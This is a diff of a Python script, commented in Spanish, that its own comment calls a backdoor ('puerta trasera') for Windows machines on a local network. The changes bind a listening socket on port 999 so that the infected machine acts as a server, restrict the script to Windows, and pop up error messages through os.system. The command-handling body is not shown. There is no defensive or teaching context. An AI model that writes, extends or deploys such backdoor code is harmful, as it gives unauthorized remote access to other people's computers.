@@ -3,8 +3,9 @@ import socket
 import os
 import re
 import threading
+import platform
 
-# codigo para puerta trasera
+# codigo para puerta trasera (solo windows)
 # pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
 
 def IPV4():
@@ -57,12 +58,14 @@ def main():
         finally:
             n=1
 
-if __name__ == '__main__':
+if __name__ == '__main__' and platform.system() == 'Windows':
     puerto = 999
     ip = IPV4()
-
-    ejecucion = True
     s = socket.socket()
     s.bind((ip,puerto))
-
-    main()
+    ejecucion = True
+    try:
+        main()
+    except Exception as e:
+        os.system(f'msg * hubo un error: {e}')
+        exit(0)
